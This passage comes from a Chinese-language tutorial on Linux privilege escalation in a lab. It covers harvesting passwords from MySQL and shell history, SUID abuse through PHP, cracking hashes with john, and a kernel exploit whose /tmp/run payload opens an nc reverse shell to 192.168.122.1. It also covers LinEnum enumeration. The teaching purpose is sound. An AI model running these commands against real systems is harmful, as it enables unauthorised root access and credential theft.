<p><img src="..\images\2021-01-23_76.jpg" alt="图片描述" /></p>

<p>然后允许一下命令，在 MySQL 数据库中收集信息：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show databases<span class="p">;</span>
use ROB
show tables<span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from rob_user<span class="p">;</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_77.jpg" alt="图片描述" /></p>

<p>如上图所示，收集到两个用户、密码信息：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:CMPc5MoAGf
alice:psoj9apv4u
</code></pre></div></div>

<p>我们再尝试一下，新打开一个终端，使用<code class="language-plaintext highlighter-rouge">CMPc5MoAGf</code> 登录 root 用户：</p>

<p><img src="..\images\2021-01-23_78.jpg" alt="图片描述" /></p>

<p>成功登录 root 用户。</p>

<p>至此，我们学习了通过寻找 Web 服务的配置文件来提权的一种方法，实际上并不一定是找 Web 服务的配置文件，其核心是通过寻找服务器上的敏感认证信息并结合密码复用进行提权的一种思想。</p>

<p>还有一种关于 mysql 的提权方法——MySQL UDF 提权，该方法在 Windows 和 Linux 上都可用。</p>

<p>UDF 是 MySQL 的一个共享库，通过 UDF 创建能够执行系统命令的函数 sys_exec、sys_eval ，可以 UDF 执行系统命令来提权，但要利用 MySQL UDF 有两个条件：</p>

<ol>
  <li>获取到 mysql root 账户密码</li>
  <li>MySQL 在系统上以 root 权限运行，没有被降权（实际上这种情况比较少）</li>
</ol>

<p>由于蓝桥实验环境的限制，无法设计相关实验，有兴趣的同学可以百度、谷歌研究一下。</p>

<h4 id="用户相关配置文件">用户相关配置文件</h4>

<p>我们主要关注下面两个用户相关的配置文件；</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">~/.bash_profile</code></li>
</ul>

<p>用于配置环境变量和启动程序，当用户登录（login）时，该文件会被执行，在某些 Linux 发行版本中，该文件是默认不创建的。</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">~/.bash_history</code></li>
</ul>

<p>每个用户的主目录下都定义了一个<code class="language-plaintext highlighter-rouge">.bash_history</code>文件，用于记录用户 shell 历史命令，默认记录最近输入的 1000 条命令，我们也许可以从中收集到一些敏感信息（部分 Linux 发行版本默认关闭了该共功能），在某些 Linux 发行版本中，默认关闭了该功能，可以尝试用 <code class="language-plaintext highlighter-rouge">history</code>命令查看。</p>

<p>首先执行如下命令以初始化实验环境：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://labfile.oss.aliyuncs.com/courses/2650/init_90_learning_2.sh <span class="o">&gt;</span> ~/init_90_learning_2.sh<span class="p">;</span><span class="nb">chmod</span> +x ~/init_90_learning_2.sh<span class="p">;</span><span class="nb">sudo</span> ./init_90_learning_2.sh
</code></pre></div></div>

<p><img src="..\images\2021-01-23_79.jpg" alt="图片描述" /></p>

<p>如上图所示，实验环境初始化完成后，我们切换到了 tomcat-syl 用户。</p>

<p>首先查看 <code class="language-plaintext highlighter-rouge">~/.bash_profile</code> 文件，看是否能收集到一下敏感信息：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> ~/.bash_profile
</code></pre></div></div>

<p><img src="..\images\2021-01-23_80.jpg" alt="图片描述" /></p>

<p>但是很可惜，看来用户 tomcat-syl 并没有使用<code class="language-plaintext highlighter-rouge">~/.bash_profile</code>文件。</p>

<p>再查看一下 <code class="language-plaintext highlighter-rouge">~/.bash_history</code>文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> ~/.bash_history
</code></pre></div></div>

<p><img src="..\images\2021-01-23_81.jpg" alt="图片描述" /></p>

<p>发现这一行历史命令记录：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>tomcat-syl:09FMWNFS7n|chpasswd
</code></pre></div></div>

<p>这条命令的含义是：修改 tomcat-syl 用户的密码为 09FMWNFS7n，我们尝试一下能否用该密码执行 sudo ：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo whoami</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_82.jpg" alt="图片描述" /></p>

<p>如上图所示，密码正确，并且能够执行 sudo 权限。接下来使用之前学过的知识获取一个 root 权限的 shell：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /bin/bash <span class="nt">-p</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_83.jpg" alt="图片描述" /></p>

<p>在本节实验中，我们学习了重点查找服务器上哪些 Web 相关的配置文件和用户相关的配置文件，随后在实验中学习了通过以上两者进行提权的方法。</p>

<p>本章的核心挂念是，在 Linux 主机上查找一些可能存放了敏感信息的文件，并不仅限于 Web 配置文件和用户配置文件， 还有一些重要文件也需要我们关注，例如：</p>

<ul>
  <li>备份文件，例如 SSH 秘钥、登录凭证等，可通过如下命令查找：</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp <span class="nt">-type</span> f <span class="se">\(</span> <span class="nt">-name</span> <span class="s2">"*backup*"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">"*</span><span class="se">\.</span><span class="s2">bak"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">"*</span><span class="se">\.</span><span class="s2">bck"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">"*</span><span class="se">\.</span><span class="s2">bk"</span> <span class="se">\)</span> 2&gt;/dev/nulll
</code></pre></div></div>

<ul>
  <li>Sqlite DB 文件</li>
</ul>

<p>本章节篇幅有限，不可能列举所有的敏感文件，但只要我们掌握通过敏感文件收集信息的核心思想，便能一法通时万法通了。</p>

<p>祝你在接下来的课程中学习愉快，学有所获~</p>

<h3 id="八-跳板用户提权">八. 跳板用户提权</h3>

<p>在本章实验中，我们会先从 www-data 提权到跳板用户 alice ，再从 alice 提权到 root 权限。</p>

<p>我们首先尝试一下 SUID 提权，在<strong>所有 www-data 用户有权访问的目录</strong>下搜索带 s 权限的可执行文件，使用到的命令如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt;/dev/null
</code></pre></div></div>

<p>搜索结果如下图所示：</p>

<p><img src="..\images\2021-01-23_84.jpg" alt="图片描述" /></p>

<p>经过分析发现没有可用于 SUID 提权的可执行文件。</p>

<p>查看一下 home 目录下有哪些文件夹：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-alh</span> /home
</code></pre></div></div>

<p><img src="..\images\2021-01-23_85.jpg" alt="图片描述" /></p>

<p>发现 <code class="language-plaintext highlighter-rouge">/home</code> 目录下有一个 alice 目录，推测有一个 alice 用户，并且是可以登录系统的，可以通过查看<code class="language-plaintext highlighter-rouge">/etc/passwd</code>文件验证。</p>

<p>但是 www-data 没有权限访问<code class="language-plaintext highlighter-rouge">alice</code>目录，所以我们需要先试试能够提权到 alice 用户。</p>

<p><img src="..\images\2021-01-23_86.jpg" alt="图片描述" /></p>

<p>经过一番尝试，我们发现<code class="language-plaintext highlighter-rouge">/etc/passwd</code>文件中有 alice 用户的密码 hash：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd
</code></pre></div></div>

<p><img src="..\images\2021-01-23_87.jpg" alt="图片描述" /></p>

<p>根据之前学习的方法，使用 john 来破解。新打开一个终端，使用如下命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john /etc/passwd
</code></pre></div></div>

<p><img src="..\images\2021-01-23_88.jpg" alt="图片描述" /></p>

<p>破解得到密码为 <code class="language-plaintext highlighter-rouge">beautiful</code>，使用 <code class="language-plaintext highlighter-rouge">su</code> 命令登录 alice 用户：</p>

<p><img src="..\images\2021-01-23_89.jpg" alt="图片描述" /></p>

<p>现在我们成功从 www-data 用户提权到了 alice 用户，再尝试一次 SUID 提权：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt;/dev/null
</code></pre></div></div>

<p><img src="..\images\2021-01-23_90.jpg" alt="图片描述" /></p>

<p>找到了<code class="language-plaintext highlighter-rouge">/var/bin/php</code>可执行文件，该文件是可以用来 SUID 提权的，方法如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/bin/php <span class="nt">-r</span> <span class="s2">"pcntl_exec('/bin/sh', ['-p']);"</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_91.jpg" alt="图片描述" /></p>

<p>如上图所示，我们成功提权到 root 权限。</p>

<ul>
  <li>关于哪些可执行文件可以用来 SUID 提权，可以通过以下链接进行查询：</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/iSecurity-Club/Pentest-Methodologies/tree/master/PostExploit/LinuxPE/SUID/Summary
</code></pre></div></div>

<p>大家思考一下：<strong>为什么 <code class="language-plaintext highlighter-rouge">alice</code> 用户能够查找到具有 s 权限的 php 可执行文件，而 <code class="language-plaintext highlighter-rouge">www-data</code> 用户找不到呢？</strong></p>

<p>其实答案就是目录权限的区别，让我们查看一下 <code class="language-plaintext highlighter-rouge">/var/bin</code> 目录权限：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lh</span> /var
</code></pre></div></div>

<p><img src="..\images\2021-01-23_92.jpg" alt="图片描述" /></p>

<p>可以看到，<code class="language-plaintext highlighter-rouge">/var/bin</code>目录的所有者和所有组均为 alice，其他用户并没有<code class="language-plaintext highlighter-rouge">读/写/执行</code>权限。</p>

<p>所以当我们提权到其他用户时，有时就能解锁一些之前无法访问的文件或目录，而这恰好就可能被利用来进行提权。</p>

<h3 id="九-内核漏洞提权">九. 内核漏洞提权</h3>

<p>在学习内核漏洞提权之前，需要给大家强调一个关键点：</p>

<p><strong>Linux 内核漏洞可能会造成 Linux 系统崩溃、宕机，因此请优先尝试前面几章中讲解的提权方法，仅当前几种方法都无法成功提权时，才考虑使用内核漏洞来提权。</strong></p>

<h4 id="1什么是-linux-内核">1.什么是 Linux 内核</h4>

<p>Linux 内核是 Linux 操作系统的主要组成部分，是计算机硬件与其进程之间的核心接口。它在两者之间进行交流，尽可能有效地管理资源。</p>

<p>内核之所以如此命名，是因为它就像硬壳里的一颗种子，存在于操作系统中，控制着硬件的所有主要功能，无论是手机、笔记本电脑、服务器还是其他任何类型的计算机。</p>

<h4 id="2什么是-linux-内核漏洞">2.什么是 Linux 内核漏洞</h4>

<p>Linux 内核是 <a href="https://www.lanqiao.cn/courses/2650/learning/(https://github.com/torvalds/linux)">Github</a> 上的一个开源项目，拥有近百万次 commit，开发人员超过 5000 人，其中包括来自微软、谷歌、英特尔和红帽等科技巨头的人才。</p>

<p>既然开发人员如此之多，代码修改如此频繁，必然会有各种各样的 Linux 内核漏洞出现。多年来，Linux 内核已经成为了积累漏洞最多的开源项目之一。</p>

<p>Linux 内核漏洞提权，就是通过利用 Linux 内核漏洞来执行具有高权限的任意代码，从而达到提权的目的。</p>

<p>使用内核漏洞提权一般包含以下三个步骤：</p>

<ol>
  <li>收集信息：确认目标主机 Linux 发行版本号、内核版本号</li>
  <li>查找漏洞：根据发行版本号和内核版本号搜索可利用的内核漏洞</li>
  <li>执行攻击：下载漏洞利用 EXP、编译 exp、执行 exp</li>
</ol>

<p>下面我们通过一个实验，来给大家详细的讲解这三个步骤的具体方法。</p>

<p>本章实验我们需要使用到 Metasploitable2 虚拟靶机，使用如下命令开启靶机：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>virsh start Metasploitable2
</code></pre></div></div>

<p><img src="..\images\2021-01-23_93.jpg" alt="图片描述" /></p>

<p>Metasploitable2 靶机的信息如下：</p>

<ul>
  <li>IP：<code class="language-plaintext highlighter-rouge">192.168.122.102</code></li>
  <li>用户名： <code class="language-plaintext highlighter-rouge">msfadmin</code></li>
  <li>密码：<code class="language-plaintext highlighter-rouge">msfadmin</code></li>
</ul>

<p>Metasploitable2 是 kvm 搭建的靶机，所以启动会比较慢。稍微等待 1~2 分钟，直到可以 ping 通<code class="language-plaintext highlighter-rouge">192.168.122.102</code>为止：</p>

<p><img src="..\images\2021-01-23_94.jpg" alt="图片描述" /></p>

<p>使用 ssh 连接到靶机，密码是 msfadmin，命令如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh msfadmin@192.168.122.102
</code></pre></div></div>

<p><img src="..\images\2021-01-23_95.jpg" alt="图片描述" /></p>

<p>如上图所示，成功登录<code class="language-plaintext highlighter-rouge">Metasploitable2</code>，权限是普通用户 <code class="language-plaintext highlighter-rouge">msfadmin</code>——用于模拟渗透测试获取到的初始 shell。</p>

<p>接下里我们将演示，从收集主机信息，到查找内核漏洞，再到下载、编译、利用漏洞 exp 提权到 root 权限的全过程。</p>

<h4 id="3收集信息">3.收集信息</h4>

<p>一般需要关注 Linux 的发行版本、内核版本，分别使用以下两个命令进行查询:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">lsb_release -a</code></li>
</ul>

<p><img src="..\images\2021-01-23_96.jpg" alt="图片描述" /></p>

<p>可以知道靶机运行的是 Ubuntu <strong>发行版本</strong>，版本号为 8.04。</p>

<p>某些发行版本的 Linux 不支持 <code class="language-plaintext highlighter-rouge">lsb_release</code> 命令，可以使用 <code class="language-plaintext highlighter-rouge">uname -sn</code>来查询。</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">uname -r</code></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">uname -r</code> 是用来查询 Linux 内核版本，注意和发行版本作区分。</p>

<p><img src="..\images\2021-01-23_97.jpg" alt="图片描述" /></p>

<p>从上图可知，靶机的内核版本为<code class="language-plaintext highlighter-rouge">2.6.24</code>。</p>

<h4 id="4查找漏洞">4.查找漏洞</h4>

<p>我们已经知道了靶机的发行版本和内核版本，接下来需要使用这两个数据去查询可能存在的内核漏洞。查询方法常用的有如下几种：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">searchsploit</code> 命令行工具（仅在 Kali Linux 上）</li>
  <li><code class="language-plaintext highlighter-rouge">Exploit-db.com</code></li>
  <li>Google 搜索引擎</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">[Exploit-db.com](http://exploit-db.com)</code> 和<code class="language-plaintext highlighter-rouge">searchsploit</code>都是同一个数据库，我们这里演示<code class="language-plaintext highlighter-rouge">[Exploit-db.com](http://exploit-db.com)</code>的查询方法。</p>

<p>打开网址：https://www.exploit-db.com/，选择左上角的 <code class="language-plaintext highlighter-rouge">EXPLOITS</code>：</p>

<p><img src="..\images\2021-01-23_98.jpg" alt="图片描述" /></p>

<p>先在右上角的 Search 输入关键词，因为是内核漏洞提权，所以先输入 <code class="language-plaintext highlighter-rouge">privilege</code> 和 <code class="language-plaintext highlighter-rouge">kernel</code>。</p>

<p>然后再键入内核版本 2.6 (一般先搜索大版本即可，搜索小版本可能导致搜索结果有遗漏)和 Linux 发行版本 ubuntu。最后的搜索关键字组合是：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege kernel 2.6 ubuntu
</code></pre></div></div>

<p>然后点击右上角的<code class="language-plaintext highlighter-rouge">Filter</code>，在高级搜索中，Type 选择 <code class="language-plaintext highlighter-rouge">local</code>、Platform 选择 <code class="language-plaintext highlighter-rouge">Linux</code>：</p>

<p><img src="..\images\2021-01-23_99.jpg" alt="图片描述" /></p>

<p>如上图所示，共得到 10 条结果，一般我们先尝试经过验证的 exp —— 即左边有绿色小勾的。</p>

<p>如果是 <code class="language-plaintext highlighter-rouge">searchsploit</code>命令行工具，使用如下命令可以查询到相同的结果，你可以在 Kali Linux 中尝试一下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit privilege|grep <span class="nt">-i</span> linux|grep <span class="nt">-i</span> kernel|grep <span class="nt">-i</span> 2.6|grep <span class="nt">-i</span> ubuntu
</code></pre></div></div>

<h4 id="5执行攻击">5.执行攻击</h4>

<p>注意：并不是每一条漏洞都可以提权成功的，通常情况下，我们会逐一尝试利用。</p>

<p>这里为了节约大家时间，我们直接选取一条可以提权成功的来做演示：</p>

<p><img src="..\images\2021-01-23_100.jpg" alt="图片描述" /></p>

<p>接下来需要下载 exp，因为大多数情况下靶机是没有连接外网的权限的，所以都是下载到攻击机（例如 Kali Linux），然后再搭建 HTTP 服务上传到靶机。</p>

<p><strong>右键</strong>下载按钮，复制下载链接地址：</p>

<p><img src="..\images\2021-01-23_101.jpg" alt="图片描述" /></p>

<p>在靶机上使用 <code class="language-plaintext highlighter-rouge">wget</code> 工具下载并存储到 <code class="language-plaintext highlighter-rouge">/tmp/exploit.c</code>，命令如下（主机是在 <code class="language-plaintext highlighter-rouge">shiyanlou</code>用户 终端，不要在 Metasploitable2 的 ssh 终端中下载）：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://www.exploit-db.com/download/8572 <span class="nt">-O</span> /tmp/exploit.c
</code></pre></div></div>

<p><img src="..\images\2021-01-23_102.jpg" alt="图片描述" /></p>

<p>接下来进入<code class="language-plaintext highlighter-rouge">/tmp</code>目录，使用 Python3 快速搭建 HTTP 服务，端口为 8000：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
python3 <span class="nt">-m</span> http.server 8000
</code></pre></div></div>

<p><img src="..\images\2021-01-23_103.jpg" alt="图片描述" /></p>

<p>使用 <code class="language-plaintext highlighter-rouge">ip addr</code> 命令查询到主机 IP 地址为 <code class="language-plaintext highlighter-rouge">192.168.122.1</code>：</p>

<p><img src="..\images\2021-01-23_104.jpg" alt="图片描述" /></p>

<p>在 Metasploitable2 终端中使用 wget 工具下载 <code class="language-plaintext highlighter-rouge">exploit.c</code> 并保存到<code class="language-plaintext highlighter-rouge">/tmp</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget 192.168.122.1:8000/exploit.c <span class="nt">-P</span> /tmp
</code></pre></div></div>

<p><img src="..\images\2021-01-23_106.jpg" alt="图片描述" /></p>

<p>接下来就需要编译 <code class="language-plaintext highlighter-rouge">exploit.c</code>，需要使用到 <code class="language-plaintext highlighter-rouge">gcc</code> 工具，命令如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c <span class="nt">-o</span> exploit
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">/tmp</code> 目录下会生成一个名为 exploit 的可执行文件：</p>

<p><img src="..\images\2021-01-23_105.jpg" alt="图片描述" /></p>

<p>尝试执行<code class="language-plaintext highlighter-rouge">./exploit</code>，弹出如下提示：</p>

<p><img src="..\images\2021-01-23_107.jpg" alt="图片描述" /></p>

<p>说明我们需要回去看一下 exp 的使用方法:</p>

<p><img src="..\images\2021-01-23_108.jpg" alt="图片描述" /></p>

<p>阅读以上说明，使用方法如下：</p>

<ol>
  <li>执行<code class="language-plaintext highlighter-rouge">./exploit PID</code> 需要指定<code class="language-plaintext highlighter-rouge">/proc/net/netlink</code> 进程的 PID 号</li>
  <li>执行成功后，会自动以 root 权限执行<code class="language-plaintext highlighter-rouge">/tmp/run</code>脚本，脚本内容需要我们自己创建，payload 我们可以任意发挥。</li>
</ol>

<p>按照以上说明，先查看<code class="language-plaintext highlighter-rouge">/proc/net/netlink</code>进程 ID：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /proc/net/netlink
</code></pre></div></div>

<p><img src="..\images\2021-01-23_109.jpg" alt="图片描述" /></p>

<p>获取到 pid 为 2410，接下来我们创建 <code class="language-plaintext highlighter-rouge">/tmp/run</code> shell 脚本：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;&gt;</span> /tmp/run
<span class="nb">echo</span> <span class="s1">'nc 192.168.122.1 4444 -e /bin/bash'</span> <span class="o">&gt;&gt;</span> /tmp/run
<span class="nb">chmod</span> +x /tmp/run
</code></pre></div></div>

<p><img src="..\images\2021-01-23_110.jpg" alt="图片描述" /></p>

<p><code class="language-plaintext highlighter-rouge">/tmp/run</code>脚本的内容如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
nc 192.168.122.1 4444 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p>这样，当该脚本被执行时，就会向 <code class="language-plaintext highlighter-rouge">192.168.122.1</code> 的 4444 端口反弹 shell，所以我们现在本地主机上使用 nc 监听 4444 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4444
</code></pre></div></div>

<p><img src="..\images\2021-01-23_111.jpg" alt="图片描述" /></p>

<p>一切准备就绪，在靶机上执行如下命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit 2410
</code></pre></div></div>

<p><img src="..\images\2021-01-23_112.jpg" alt="图片描述" /></p>

<p>如上图所示，成功反弹回 shell。</p>

<h3 id="十-暴力破解提权">十. 暴力破解提权</h3>

<h3 id="十一-自动化提权工具">十一. 自动化提权工具</h3>

<p>Github 上有很多相关的开源项目，在本章节实验中我会推荐两个比较有代表性的：</p>

<ul>
  <li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
  <li><a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></li>
</ul>

<p>和内核漏洞提权那章相同，本章实验我们也需要使用到 Metasploitable2 虚拟靶机，使用如下命令开启靶机：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>virsh start Metasploitable2
</code></pre></div></div>

<p><img src="..\images\2021-01-23_113.jpg" alt="图片描述" /></p>

<p>Metasploitable2 靶机的信息如下：</p>

<ul>
  <li>IP：<code class="language-plaintext highlighter-rouge">192.168.122.102</code></li>
  <li>用户名： <code class="language-plaintext highlighter-rouge">msfadmin</code></li>
  <li>密码：<code class="language-plaintext highlighter-rouge">msfadmin</code></li>
</ul>

<p>Metasploitable2 是 kvm 搭建的靶机，所以启动会比较慢。稍微等待 1~2 分钟，直到可以 ping 通<code class="language-plaintext highlighter-rouge">192.168.122.102</code>为止：</p>

<p><img src="..\images\2021-01-23_114.jpg" alt="图片描述" /></p>

<p>使用 ssh 连接到靶机，密码是 msfadmin，命令如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh msfadmin@192.168.122.102
</code></pre></div></div>

<p><img src="..\images\2021-01-23_115.jpg" alt="图片描述" /></p>

<p>如上图所示，成功登录<code class="language-plaintext highlighter-rouge">Metasploitable2</code>，权限是普通用户 <code class="language-plaintext highlighter-rouge">msfadmin</code>——用于模拟渗透测试获取到的初始 shell。</p>

<h4 id="linenum-工具">LinEnum 工具</h4>

<h5 id="linenum-介绍">LinEnum 介绍</h5>

<p>LinEnum 是一个 Linux 主机本地信息枚举的 shell 脚本，它有超过 65 项安全检查功能，比如查询版本信息、内核信息、SUID/GUID 文件、文件权限、sudo 权限等，其执行的检查项摘要如下：</p>

<ul>
  <li>内核和发行版本的详细信息</li>
  <li>系统信息、主机名、网络信息</li>
  <li>用户信息、用户列表、用户组</li>
  <li>敏感目录、文件的访问权限</li>
  <li>环境变量配置详情</li>
  <li>CronJobs 配置详情</li>
  <li>运行服务、服务权限</li>
  <li>部分应用的版本信息</li>
</ul>

<p>更为详细的检查项说明，可以查阅项目的<code class="language-plaintext highlighter-rouge">[README.md](https://github.com/rebootuser/LinEnum)</code>文档。</p>

<h5 id="项目地址">项目地址</h5>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/rebootuser/LinEnum
</code></pre></div></div>

<h5 id="使用方法">使用方法</h5>

<p>因为大多数情况下靶机是没有连接外网的权限的，所以都是先下载到攻击机（例如 Kali Linux），然后再搭建 HTTP 服务上传到靶机。</p>

<p>在云主机上使用 <code class="language-plaintext highlighter-rouge">wget</code> 工具下载并存储到 <code class="language-plaintext highlighter-rouge">/tmp/exploit.c</code>，命令如下（不要在 Metasploitable2 的 ssh 终端中下载，会报 SSL 错误）：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 如果遇到拒绝连接错误，多尝试几次即可</span>
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh <span class="nt">-O</span> /tmp/LinEnum.sh
</code></pre></div></div>

<p><img src="..\images\2021-01-23_117.jpg" alt="图片描述" /></p>

<p>接下来进入<code class="language-plaintext highlighter-rouge">/tmp</code>目录，使用 Python3 快速搭建 HTTP 服务，端口为 8000：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
python3 <span class="nt">-m</span> http.server 8000
</code></pre></div></div>

<p><img src="..\images\2021-01-23_118.jpg" alt="图片描述" /></p>

<p>使用 <code class="language-plaintext highlighter-rouge">ip addr</code> 命令查询到主机 IP 地址为 <code class="language-plaintext highlighter-rouge">192.168.122.1</code>：</p>

<p><img src="..\images\2021-01-23_119.jpg" alt="图片描述" /></p>

<p>在 Metasploitable2 终端中使用 wget 工具下载 <code class="language-plaintext highlighter-rouge">LinEnum.sh</code>并保存到<code class="language-plaintext highlighter-rouge">/tmp</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget 192.168.122.1:8000/LinEnum.sh <span class="nt">-P</span> /tmp
</code></pre></div></div>

<p><img src="..\images\2021-01-23_120.jpg" alt="图片描述" /></p>

<p>赋予<code class="language-plaintext highlighter-rouge">LinEnum.sh</code>执行权限：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x LinEnum.sh
</code></pre></div></div>

<p>接下来就可以执行<code class="language-plaintext highlighter-rouge">LinEnum.sh</code>进行检查，由于<code class="language-plaintext highlighter-rouge">LinEnum.sh</code>执行速度非常快，所以可以搭配 <code class="language-plaintext highlighter-rouge">more</code> 命令便于阅读，使用空格进行翻页：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./LinEnum.sh |more
</code></pre></div></div>

<p><img src="..\images\2021-01-23_121.gif" alt="图片描述" /></p>

<p><img src="..\images\2021-01-23_122.gif" alt="图片描述" /></p>

<p>自动快速收集系统信息，便于我们阅读分析，<strong>重点关注黄色字体的信息。</strong></p>

<ul>
  <li>发现具有<code class="language-plaintext highlighter-rouge">/root</code>目录的访问权限：</li>
</ul>

<p><img src="..\images\2021-01-23_123.jpg" alt="图片描述" /></p>

<ul>
  <li>发现软件版本及弱口令：</li>
</ul>

<p><img src="..\images\2021-01-23_124.jpg" alt="图片描述" /></p>

<p>如上图所示，发现 MySQL 的 root 用户无需密码即可登录，测试一下发现登陆成功：</p>

<p><img src="..\images\2021-01-23_125.jpg" alt="图片描述" /></p>

<ul>
  <li>发现 <code class="language-plaintext highlighter-rouge">htpasswd</code>文件：</li>
</ul>

<p><img src="..\images\2021-01-23_126.jpg" alt="图片描述" /></p>

<ul>
  <li>发现可利用的 SUID 文件<code class="language-plaintext highlighter-rouge">nmap</code>：</li>
</ul>

<p><img src="..\images\2021-01-23_127.jpg" alt="图片描述" /></p>

<p>尝试利用 nmap 提权，并且提权成功：</p>

<p><img src="..\images\2021-01-23_128.jpg" alt="图片描述" /></p>

<ul>
  <li>发现可查看 root 用户的 <code class="language-plaintext highlighter-rouge">.bash_history</code>文件：</li>
</ul>

<p><img src="..\images\2021-01-23_129.jpg" alt="图片描述" /></p>

<p>有没有觉得很方便？合理的利用 <code class="language-plaintext highlighter-rouge">LinEnum.sh</code>脚本，可以为我们节约大量的时间。</p>

<h4 id="linux-exploit-suggester-工具">linux-exploit-suggester 工具</h4>

<h5 id="linux-exploit-suggester-介绍">linux-exploit-suggester 介绍</h5>

<p><code class="language-plaintext highlighter-rouge">linux-exploit-suggester</code> 是一款根据系统发行版本号和内核版本号自动查找相应内核提权漏洞的工具。</p>

<p><code class="language-plaintext highlighter-rouge">LinEnum</code> 功能已经非常强大，但它缺少对内核漏洞的检查，而<code class="language-plaintext highlighter-rouge">linux-exploit-suggester</code>刚好能弥补这一点。</p>

<h5 id="项目地址-1">项目地址</h5>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/mzet-/linux-exploit-suggester
</code></pre></div></div>

<h5 id="使用方法-1">使用方法</h5>

<p>和之前一样，下载<code class="language-plaintext highlighter-rouge">linux-exploit-suggester.sh</code> 到云主机:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh <span class="nt">-O</span> /tmp/linux-exploit-suggester.sh
</code></pre></div></div>

<p>并上传到靶机<code class="language-plaintext highlighter-rouge">Metasploitable2</code>:</p>

